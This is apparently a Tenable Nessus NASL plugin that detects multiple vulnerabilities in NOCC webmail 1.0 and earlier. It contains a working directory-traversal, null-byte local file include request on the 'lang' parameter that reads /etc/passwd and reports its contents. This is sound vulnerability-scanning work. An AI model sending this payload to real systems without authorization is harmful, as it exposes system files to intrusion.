#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20974);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-0891", "CVE-2006-0892", "CVE-2006-0893", "CVE-2006-0894", "CVE-2006-0895");
  script_bugtraq_id(16793);
  script_xref(name:"OSVDB", value:"23416");
  script_xref(name:"OSVDB", value:"23417");
  script_xref(name:"OSVDB", value:"23418");
  script_xref(name:"OSVDB", value:"23419");
  script_xref(name:"OSVDB", value:"23420");
  script_xref(name:"OSVDB", value:"23421");
  script_xref(name:"OSVDB", value:"23422");
  script_xref(name:"OSVDB", value:"23423");
  script_xref(name:"OSVDB", value:"23424");
  script_xref(name:"OSVDB", value:"23425");
  script_xref(name:"OSVDB", value:"23426");
  script_xref(name:"OSVDB", value:"23427");

  script_name(english:"NOCC <= 1.0 Multiple Vulnerabilities");
  script_summary(english:"Checks for a local file include flaw in NOCC");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running NOCC, an open-source webmail application
written in PHP. 

The installed version of NOCC is affected by a local file include flaw
because it fails to sanitize user input to the 'lang' parameter of the
'index.php' script before using it to include other PHP files. 
Regardless of PHP's 'register_globals' and 'magic_quotes_gpc'
settings, an unauthenticated attacker can leverage this issue to view
arbitrary files on the remote host and possibly to execute arbitrary
PHP code in files on the affected host. 

In addition, NOCC reportedly is affected by several other local and
remote file include, cross-site scripting, and information disclosure
vulnerabilities." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/noccw_10_incl_xpl.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/425889/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/nocc", "/NOCC", "/webmail", "/mail", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (isnull(res)) exit(0);

  # If the initial page looks like NOCC...
  if ("nocc_webmail_login" >< res) {
    # Try to exploit one of the local file include flaw to read a file.
    file = "../../../../../../../../../../etc/passwd";
    req = http_get(
      item:string(
        dir, "/index.php?",
        "lang=", file, "%00"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (isnull(res)) exit(0);

    # There's a problem if it looks like the passwd file.
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      contents = res - strstr(res, '<!DOCTYPE html PUBLIC');
      if (contents) contents = contents - strstr(contents, "<br>");
      if (contents) {
        report = string(
          "\n",
          "Here are the contents of '/etc/passwd' that Nessus was able to\n",
          "read from the remote host :\n",
          "\n",
          contents
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
